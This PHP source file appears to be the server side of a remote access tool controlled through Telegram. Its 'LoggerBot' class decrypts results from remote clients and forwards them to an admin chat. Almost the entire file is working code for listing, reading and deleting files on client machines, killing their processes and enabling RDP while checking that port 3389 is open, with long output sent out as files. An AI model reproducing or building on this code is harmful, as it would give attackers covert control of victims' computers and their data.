<?php
class LoggerBot
{

    private function sendFileList($clientId, $files, $path)
    {
        $message = "Files in `$path`:\n";
        $keyboard = ['inline_keyboard' => []];
        $row = [];
        foreach ($files as $file) {
            $type = $file['type'] === 'directory' ? '📁' : '📄';
            $size = round($file['size'] / 1024, 2) . ' KB';
            $message .= "$type {$file['name']} ($size, {$file['modified']})\n";
            if ($file['type'] === 'file') {
                $row[] = ['text' => "Read {$file['name']}", 'callback_data' => "file_action:read|" . urlencode($path . '/' . $file['name'])];
                $row[] = ['text' => "Delete {$file['name']}", 'callback_data' => "file_action:delete|" . urlencode($path . '/' . $file['name'])];
            } else {
                $row[] = ['text' => "Browse {$file['name']}", 'callback_data' => "command:/browse " . urlencode($path . '/' . $file['name'])];
            }
            if (count($row) >= 2) {
                $keyboard['inline_keyboard'][] = $row;
                $row = [];
            }
        }
        if ($row) {
            $keyboard['inline_keyboard'][] = $row;
        }

        if (strlen($message) > 4000) {
            $tempFile = Config::$UPLOAD_DIR . "file_list_$clientId.txt";
            file_put_contents($tempFile, $message);
            $this->sendTelegramFile(Config::$ADMIN_CHAT_ID, $tempFile);
            unlink($tempFile);
        } else {
            $this->sendTelegramMessage(Config::$ADMIN_CHAT_ID, $message, ['reply_markup' => $keyboard]);
        }
    }

    private function sendFileContent($clientId, $content, $filePath)
    {
        if (strlen($content) > 4000) {
            $tempFile = Config::$UPLOAD_DIR . "file_content_$clientId.txt";
            file_put_contents($tempFile, $content);
            $this->sendTelegramFile(Config::$ADMIN_CHAT_ID, $tempFile);
            unlink($tempFile);
        } else {
            $message = "Content of `$filePath`:\n```\n$content\n```";
            $this->sendTelegramMessage(Config::$ADMIN_CHAT_ID, $message);
        }
    }

    private function handleCommandResponse($data)
    {
        try {
            $commandId = $data['command_id'] ?? null;
            $result = isset($data['result']) ? $this->decrypt($data['result']) : '';
            if (!$commandId) {
                $this->logError("Missing command_id in command response");
                return ['error' => 'Missing command_id'];
            }

            $resultData = json_decode($result, true);
            $stmt = $this->pdo->prepare(
                "UPDATE client_commands SET status = 'completed', result = ?, completed_at = NOW() 
            WHERE id = ?"
            );
            $stmt->execute([strlen($result) > 65000 ? 'Result too large, sent as file' : $result, $commandId]);

            $stmt = $this->pdo->prepare(
                "SELECT client_id, command FROM client_commands WHERE id = ?"
            );
            $stmt->execute([$commandId]);
            $commandData = $stmt->fetch();
            if ($commandData) {
                $clientId = $commandData['client_id'];
                $decryptedCommand = $this->decrypt($commandData['command']);
                $commandJson = json_decode($decryptedCommand, true);
                $commandType = $commandJson['type'] ?? 'unknown';
                $commandParams = $commandJson['params'] ?? [];

                if ($commandType === 'file_operation' && isset($commandParams['action'])) {
                    if ($commandParams['action'] === 'list' && isset($resultData['files'])) {
                        $this->sendFileList($clientId, $resultData['files'], $commandParams['path']);
                    } elseif ($commandParams['action'] === 'read' && isset($resultData['content'])) {
                        $this->sendFileContent($clientId, $resultData['content'], $resultData['file_path']);
                    } elseif ($commandParams['action'] === 'recursive_list' && isset($resultData['file_path'])) {
                        $this->sendTelegramFile(Config::$ADMIN_CHAT_ID, $resultData['file_path']);
                    } elseif ($commandParams['action'] === 'write' || $commandParams['action'] === 'delete') {
                        $this->sendTelegramMessage(
                            Config::$ADMIN_CHAT_ID,
                            "Command '$commandType' ($commandParams[action]) completed for client $clientId: $result"
                        );
                    }
                } elseif ($commandType === 'end_task' && isset($commandParams['process_name'])) {
                    $message = "Command 'end_task' for process '{$commandParams['process_name']}' on client $clientId: ";
                    if (isset($resultData['status']) && $resultData['status'] === 'success') {
                        $message .= "Successfully terminated.";
                    } else {
                        $message .= "Failed - " . ($resultData['message'] ?? 'Unknown error');
                    }
                    $this->sendTelegramMessage(Config::$ADMIN_CHAT_ID, $message);
                } elseif ($commandType === 'enable_rdp' || $commandType === 'disable_rdp') {
                    $status = isset($resultData['status']) && $resultData['status'] === 'success' ? 'successful' : 'failed';
                    $port_status = $this->testPort($resultData['public_ip'] ?? 'unknown', 3389);
                    $message = "Command '$commandType' on client $clientId: $status\n";
                    $message .= "Details: " . ($resultData['message'] ?? 'No details') . "\n";
                    $message .= "Port 3389 Status: " . ($port_status ? "Open" : "Closed");
                    $this->sendTelegramMessage(Config::$ADMIN_CHAT_ID, $message);
                } else {
                    $this->sendTelegramMessage(
                        Config::$ADMIN_CHAT_ID,
                        "Command '$commandType' result for client $clientId:\n" . ($result ?: 'No result')
                    );
                }
            }

            $this->logWebhook("Updated command response for command_id: $commandId, result: " . substr($result, 0, 50));
            return ['status' => 'success'];
        } catch (PDOException $e) {
            $this->logError("Command response failed: " . $e->getMessage());
            return ['error' => 'Response processing failed'];
        }
    }
}
